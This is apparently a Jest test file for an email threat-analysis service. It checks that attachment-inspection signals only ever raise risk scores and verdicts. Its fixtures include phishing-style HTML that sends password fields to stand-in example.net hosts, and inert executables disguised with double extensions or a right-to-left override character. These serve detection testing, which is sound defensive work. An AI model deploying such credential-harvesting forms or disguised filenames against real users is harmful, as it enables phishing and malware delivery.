/**
 * Risk fusion with attachment-inspection signals: they only ever raise.
 * Across every verdict and score, adding a signal never lowers the score,
 * never makes a verdict more benign, and respects the verdict bands; an
 * inspected, inert attachment produces no signal at all.
 */

import {
  ATTACHMENT_RISK_FLOOR,
  VERDICT_SCORE_BANDS,
  fuseRisk,
} from '../../../../src/services/intelligence/risk.fusion';
import { createFailedAnalysisResult } from '../../../../src/services/ai/provider.interface';
import { attachmentRiskSignals } from '../../../../src/services/attachments/risk';
import { inspectBytes } from '../../../../src/services/attachments';
import { InspectionContext } from '../../../../src/services/attachments/limits';
import { DEFAULT_ATTACHMENT_ANALYSIS_SETTINGS } from '../../../../src/services/attachments/types';
import type { AttachmentRiskSignal } from '../../../../src/services/attachments/risk';
import { AnalysisResult, EmailAttachment, ThreatVerdict } from '../../../../src/types';
import { buildDocx, buildPdf, buildZip, inertExecutable } from '../../../../src/eval/injection/fixtures';

const VERDICTS: ThreatVerdict[] = [
  'legitimate',
  'graymail',
  'spam',
  'suspicious',
  'bec',
  'phishing',
  'malware_delivery',
];
const SEVERITY: Record<string, number> = {
  legitimate: 0,
  graymail: 1,
  spam: 1,
  undetermined: 2,
  suspicious: 3,
  bec: 4,
  phishing: 4,
  malware_delivery: 4,
};

function result(verdict: ThreatVerdict, riskScore: number): AnalysisResult {
  return {
    summary: 'test',
    isPhishing: false,
    confidence: 'High',
    indicators: [],
    recommendations: [],
    assessment: { verdict, riskScore, verdictConfidence: 0.9, threatVectors: [], targeting: 'unknown' },
  };
}

async function analyzed(name: string, bytes: Buffer): Promise<EmailAttachment> {
  const settings = { ...DEFAULT_ATTACHMENT_ANALYSIS_SETTINGS, enabled: true };
  return {
    filename: name,
    contentType: 'application/octet-stream',
    size: bytes.length,
    analysis: await inspectBytes(bytes, name, undefined, InspectionContext.forEmail(settings)),
  };
}

const SIGNAL_SETS: AttachmentRiskSignal[][] = [
  ['credential_form'],
  ['disguised_executable'],
  ['credential_form', 'disguised_executable'],
];

describe('attachment signals in risk fusion', () => {
  it('never lowers risk or makes a verdict more benign, for every verdict and score', () => {
    for (const verdict of VERDICTS) {
      for (let score = 0; score <= 100; score += 5) {
        const base = fuseRisk(result(verdict, score));
        for (const signals of SIGNAL_SETS) {
          const raised = fuseRisk(result(verdict, score), { attachmentSignals: signals });
          expect(raised.riskScore).toBeGreaterThanOrEqual(base.riskScore);
          expect(SEVERITY[raised.verdict]).toBeGreaterThanOrEqual(SEVERITY[base.verdict]);
          if (base.isPhishing) expect(raised.isPhishing).toBe(true);
          const band = VERDICT_SCORE_BANDS[raised.verdict as Exclude<ThreatVerdict, 'undetermined'>];
          expect(raised.riskScore).toBeGreaterThanOrEqual(band.min);
          expect(raised.riskScore).toBeLessThanOrEqual(band.max);
          expect(raised.reasons.length).toBeGreaterThan(base.reasons.length);
        }
      }
    }
  });

  it('turns a benign verdict into suspicious at the floor, with a reason, and flags it', () => {
    const decision = fuseRisk(result('legitimate', 3), { attachmentSignals: ['credential_form'] });
    expect(decision.verdict).toBe('suspicious');
    expect(decision.riskScore).toBe(ATTACHMENT_RISK_FLOOR);
    expect(decision.isPhishing).toBe(true);
    expect(decision.confidenceBasis).toBe('attachment_inspection');
    expect(decision.reasons.join(' ')).toMatch(/password field/);
    expect(decision.reasons.join(' ')).toMatch(/treating it as suspicious/);
  });

  it('keeps a malicious model verdict and its confidence', () => {
    const decision = fuseRisk(result('phishing', 92), { attachmentSignals: ['disguised_executable'] });
    expect(decision.verdict).toBe('phishing');
    expect(decision.riskScore).toBe(92);
    expect(decision.confidenceBasis).toBe('model');
    expect(decision.reasons.join(' ')).toMatch(/program or script/);
  });

  it('cannot be undone by the safe-sender cap', () => {
    const decision = fuseRisk(result('legitimate', 2), {
      isSafeSender: true,
      attachmentSignals: ['credential_form'],
    });
    expect(decision.verdict).toBe('suspicious');
    expect(decision.riskScore).toBe(ATTACHMENT_RISK_FLOOR);
  });

  it('escalates a failed analysis to suspicious rather than leaving it unassessed', () => {
    const decision = fuseRisk(createFailedAnalysisResult('provider down'), {
      attachmentSignals: ['disguised_executable'],
    });
    expect(decision.verdict).toBe('suspicious');
    expect(decision.confidenceBasis).toBe('attachment_inspection');
  });

  it('is a no-op without signals', () => {
    expect(fuseRisk(result('legitimate', 3), { attachmentSignals: [] })).toEqual(
      fuseRisk(result('legitimate', 3))
    );
  });
});

describe('attachmentRiskSignals', () => {
  it('produces no signal for inspected, inert attachments (nothing to lower risk with)', async () => {
    const attachments = await Promise.all([
      analyzed('invoice.pdf', buildPdf({ pages: [['Invoice 1001, total due 250.00, payable by bank transfer within 30 days.']] })),
      analyzed('letter.docx', buildDocx({ paragraphs: ['Thank you for your order.'] })),
      analyzed('archive.zip', buildZip([{ name: 'notes.txt', data: 'meeting notes' }])),
    ]);
    expect(attachments.every(a => a.analysis?.status === 'inspected')).toBe(true);
    expect(attachmentRiskSignals(attachments)).toEqual([]);
    // And the decision is exactly what it is without attachment analysis
    expect(fuseRisk(result('suspicious', 45), { attachmentSignals: attachmentRiskSignals(attachments) })).toEqual(
      fuseRisk(result('suspicious', 45))
    );
  });

  it('recognizes a credential form and a disguised executable, at any depth', async () => {
    const form = await analyzed(
      'view.html',
      Buffer.from('<html><form action="https://collect.example.net/"><input type="password"></form></html>')
    );
    expect(attachmentRiskSignals([form])).toEqual(['credential_form']);

    const scripted = await analyzed(
      'view.html',
      Buffer.from('<html><input type="password" id="p"><script>fetch("https://c.example.net/",{method:"POST"})</script></html>')
    );
    expect(attachmentRiskSignals([scripted])).toEqual(['credential_form']);

    // A password field alone (no destination) is not decisive
    const local = await analyzed('view.html', Buffer.from('<html><form><input type="password"></form></html>'));
    expect(attachmentRiskSignals([local])).toEqual([]);

    expect(attachmentRiskSignals([await analyzed('statement.pdf.exe', inertExecutable())])).toEqual([
      'disguised_executable',
    ]);
    expect(attachmentRiskSignals([await analyzed('statement.pdf', inertExecutable())])).toEqual([
      'disguised_executable',
    ]);
    expect(attachmentRiskSignals([await analyzed('invoice‮fdp.exe', inertExecutable())])).toEqual([
      'disguised_executable',
    ]);
    // An honestly named executable is high-risk but not disguised
    expect(attachmentRiskSignals([await analyzed('setup.exe', inertExecutable())])).toEqual([]);

    const nested = await analyzed(
      'docs.zip',
      buildZip([{ name: 'inner.zip', data: buildZip([{ name: 'scan.jpg.scr', data: inertExecutable() }]) }])
    );
    expect(attachmentRiskSignals([nested])).toEqual(['disguised_executable']);
  });

  it('ignores attachments that were not analyzed', () => {
    expect(attachmentRiskSignals([{ filename: 'a.pdf.exe', contentType: 'x', size: 1 }])).toEqual([]);
  });
});
